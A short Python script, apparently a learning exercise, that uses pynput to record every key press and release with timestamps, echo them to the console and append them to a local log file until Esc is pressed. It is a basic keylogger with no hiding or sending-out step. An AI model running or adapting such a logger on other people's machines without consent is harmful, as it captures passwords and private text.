import datetime
from pynput.keyboard import Key, Listener
LOG_FILE = "registrodeteclado.txt"
contador_eventos=1

def formato_evento(accion,key_str):
    global contador_eventos
    now=datetime.datetime.now()
    timestamp=now.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
    id_evento= f"Evento {contador_eventos:03d}"
    contador_eventos += 1
    return f"{timestamp} | {accion} | {id_evento} | Tecla: {key_str}\n"

def log_to_file(entrada):
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(entrada)
def on_press(key):
    try:
        key_str=key.char
    except AttributeError:
        key_str=str(key)
    log_entry=formato_evento("PRESS: ",key_str)
    print(log_entry.strip())
    log_to_file(log_entry)

def on_release(key):
    try:
        key_str = key.char
    except AttributeError:
        key_str = str(key)
        
    log_entry = formato_evento("RELEASE: ", key_str)
    print(log_entry.strip())
    log_to_file(log_entry)
    
    if key == Key.esc:
        return False

if __name__ == "__main__":
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(f"\n--- Inicio de Sesión: {datetime.datetime.now()} ---\n")
        
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()